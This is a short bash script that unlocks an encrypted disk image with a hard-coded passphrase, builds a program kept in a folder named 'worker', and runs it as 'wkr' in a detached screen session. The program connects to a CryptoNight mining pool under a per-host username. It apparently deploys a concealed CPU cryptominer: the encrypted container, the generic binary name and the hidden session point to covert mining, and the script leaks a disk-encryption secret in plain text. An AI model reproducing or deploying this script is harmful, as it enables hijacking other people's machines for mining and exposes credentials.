#!/usr/bin/env bash
sudo killall -9 screen
echo j6Vf0BnmYmp9aqgD | sudo cryptsetup luksOpen ~/img img -
sudo mount /dev/mapper/img /mnt
cd /mnt/worker
rm -rf CMakeCache.txt
rm -rf CMakeFiles/
rm -rf Makefile
rm -rf cmake_install.cmake
rm -rf config.txt
rm -rf cpu.txt
rm -rf pools.txt
sudo apt-get -y install libmicrohttpd-dev libssl-dev cmake build-essential
cmake . -DOpenCL_ENABLE=OFF -DCUDA_ENABLE=OFF -DHWLOC_ENABLE=OFF
make
cd ..
screen -S wkr -d -m ./wkr -u zeekay.$HOSTNAME -o us-east.cryptonight-hub.miningpoolhub.com:20580
